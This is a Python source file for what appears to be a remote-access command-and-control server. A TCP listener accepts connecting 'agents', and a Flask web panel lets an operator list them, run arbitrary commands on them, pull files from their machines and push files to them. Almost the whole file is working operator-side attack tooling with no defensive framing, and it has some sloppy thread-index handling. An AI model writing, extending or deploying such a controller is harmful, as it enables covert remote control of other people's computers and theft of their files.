import socket
import threading
import time
from flask import Flask, render_template, request
from pathlib import Path

class Server():
    
    def __init__(self):
        self.server_IP = '127.0.0.1'
        self.server_PORT = 40000
        self.server_flask_port = 60000
        self.app = Flask(__name__)
        self.app.add_url_rule('/', 'index', self.index)
        self.app.add_url_rule('/agents', 'agents', self.agents)
        self.app.add_url_rule("/<agentname>/executecmd", "agentnameexecutecmd", self.executecmd)
        self.app.add_url_rule("/<agentname>/execute", "agentnameexecute", self.execute, methods=['GET', 'POST']) 
        
        # Initialize threads, input/output, and IPs
        self.threads_index = 0
        self.THREADS = [''] * 20
        self.CMD_INPUT = [''] * 20
        self.CMD_OUTPUT = [''] * 20
        self.IPS = [''] * 20

    def handle_connection(self, connection, address, thread_index):
        # Ensure that CMD_OUTPUT, CMD_INPUT, and IPS grow dynamically
        while len(self.CMD_OUTPUT) <= thread_index:
            self.CMD_OUTPUT.append('')  # Dynamically grow the CMD_OUTPUT list
        while len(self.CMD_INPUT) <= thread_index:
            self.CMD_INPUT.append('')  # Dynamically grow the CMD_INPUT list
        while len(self.IPS) <= thread_index:
            self.IPS.append('')  # Dynamically grow the IPS list

        # Proceed with handling the connection
        
        while self.CMD_INPUT[thread_index] != 'quit':
            msg = connection.recv(4096).decode()
            self.CMD_OUTPUT[thread_index] = msg
            while True:
                if self.CMD_INPUT[thread_index] != '':
                    if self.CMD_INPUT[thread_index].split(" ")[0] == 'download':
                        filename = self.CMD_INPUT[thread_index].split(" ")[1].split('\\')[-1]
                        cmd = self.CMD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        contents = connection.recv(4096*10000).decode()
                        f = open('.\\output\\' + filename, 'wb')
                        f.write(contents.encode())
                        f.close()
                        self.CMD_OUTPUT[thread_index] = f'File Transfer Complete! {filename} transferred!'
                        self.CMD_INPUT[thread_index] = ''
                    elif self.CMD_INPUT[thread_index].split(" ")[0] == 'upload':
                        cmd = self.CMD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        filename = self.CMD_INPUT[thread_index].split(" ")[1]
                        filesize = self.CMD_INPUT[thread_index].split(" ")[2]
                        f = open('.\\output\\' + filename, 'rb')
                        contents = f.read()
                        f.close()
                        connection.send(contents)
                        msg = connection.recv(4096).decode()
                        if msg == 'File sent succesfully!':
                            self.CMD_OUTPUT[thread_index] = 'File sent succesfully!'
                            self.CMD_INPUT[thread_index] = ''
                        else:
                            self.CMD_OUTPUT[thread_index] = 'An Error occured!'
                            self.CMD_INPUT[thread_index] = ''
                                            
                    else:
                        msg = self.CMD_INPUT[thread_index]
                        connection.send(msg.encode())
                        self.CMD_INPUT[thread_index] = ''
                        break
        
        # Close the connection when done
        self.close_connection(connection, thread_index)

    def close_connection(self, connection, thread_index):
        connection.close()

        # Remove the agent details and re-append empty strings
        del self.THREADS[thread_index]
        del self.IPS[thread_index]
        del self.CMD_INPUT[thread_index]
        del self.CMD_OUTPUT[thread_index]

        # Re-append empty strings to maintain list size
        self.THREADS.append('')
        self.IPS.append('')
        self.CMD_INPUT.append('')
        self.CMD_OUTPUT.append('')

    def server_socket(self):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.bind((self.server_IP, self.server_PORT))
        server_sock.listen(5)
        print(f'Server socket is running on {self.server_IP}:{self.server_PORT}')
        
        while True:
            connection, address = server_sock.accept()
            print(f"Connection received from {address}!")
            thread_index = len(self.THREADS)
            
            # Create daemon thread for handling the connection
            t = threading.Thread(target=self.handle_connection, args=(connection, address, thread_index))
            t.daemon = True  # Mark the thread as a daemon thread
            self.THREADS.append(t)
            self.IPS.append(address)
            
            # Start the thread
            t.start()

    def index(self):
        return render_template('index.html')
    
    def agents(self):
        return render_template('agents.html', threads=self.THREADS, ips=self.IPS)
    
    def executecmd(self, agentname):
        req_index = None
        for i in self.THREADS:
            if isinstance(i, threading.Thread) and hasattr(i, 'name'):
                if agentname in i.name:
                    req_index = self.THREADS.index(i)
                    break  # Stop once the correct thread is found
        if req_index is not None:
            return render_template('execute.html', name=agentname)
        else:
            return f"Agent {agentname} not found", 404
    
    def execute(self, agentname):
        if request.method=='POST':
            cmd = request.form['command']
            for i in self.THREADS:
                if isinstance(i, threading.Thread) and hasattr(i, 'name'):
                    if agentname in i.name:
                        req_index = self.THREADS.index(i)
                        break
            self.CMD_INPUT[req_index] = cmd
            time.sleep(1)
            cmdoutput = self.CMD_OUTPUT[req_index]
            return render_template('execute.html', cmdoutput=cmdoutput, name=agentname)
            
    
    def start_flask(self):
        """Run Flask app in a separate thread."""
        print(f"Starting Flask app on {self.server_IP}:{self.server_flask_port}")
        self.app.run(host=self.server_IP, port=self.server_flask_port, threaded=True)

    def run(self, debugging=True):
        # Start server_socket in a separate thread
        socket_thread = threading.Thread(target=self.server_socket)
        socket_thread.daemon = True  # Make the socket thread a daemon
        socket_thread.start()
        
        # Start Flask app in a separate thread
        flask_thread = threading.Thread(target=self.start_flask)
        flask_thread.daemon = True  # Make the Flask thread a daemon
        flask_thread.start()

        # Keep the main program running while the threads are active
        try:
            while True:
                pass  # Keep the main program alive to handle connections
        except KeyboardInterrupt:
            print("\nServer shutting down...")

    
if __name__ == '__main__':
    my_app = Server()
    my_app.run()